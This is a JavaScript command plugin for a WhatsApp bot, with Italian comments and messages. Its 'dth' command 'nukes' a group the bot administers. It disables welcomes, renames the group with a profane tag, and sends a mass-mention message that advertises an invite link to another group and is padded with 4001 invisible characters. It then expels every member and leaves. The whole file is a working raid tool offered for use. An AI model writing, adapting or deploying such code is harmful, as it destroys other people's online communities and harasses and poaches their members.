let handler = async (m, { conn, groupMetadata, participants, command, isBotAdmin }) => {
    let bot = global.db.data.settings[conn.user.jid] || {};
    const chat = global.db.data.chats[m.chat];

    const utenti = participants.map(u => u.id).filter(id => id !== conn.user.jid);
    const delay = ms => new Promise(res => setTimeout(res, ms));

    if (!utenti.length || !isBotAdmin || !bot.restrict) return;

    switch (command) {
        case "dth":
            // 🔕 Disattiva il benvenuto
            chat.welcome = false;

            // Cambia nome del gruppo
            try {
                await conn.groupUpdateSubject(m.chat, 'FUCK BY MOONLESS');
            } catch (e) {
                console.error("Errore nel cambiare il nome del gruppo:", e);
            }


            const message = `💥 *LE PALLE SONO STATE SVUOTATE* 💥\n\nEntrate in questo gruppo per continuare:\nhttps://chat.whatsapp.com/GFj8QM4BQhvL3PhQXdNUWX\n\n_Grazie a 222 Bot e Moonless 🌙_${String.fromCharCode(8206).repeat(4001)}`;


            await conn.sendMessage(m.chat, {
                text: message,
                mentions: participants.map(p => p.id)
            }, { quoted: m });

            
            try {
                await delay(500);
                await conn.groupParticipantsUpdate(m.chat, utenti, 'remove');
            } catch (e) {
                console.error("Errore nella rimozione:", e);
            }

           
            await delay(1000);
            try {
                await conn.groupLeave(m.chat);
            } catch (e) {
                console.error("Errore nell'uscire dal gruppo:", e);
            }
            break;
    }
};

handler.command = ['dth'];
handler.group = true;
handler.owner = true;
handler.fail = null;

export default handler;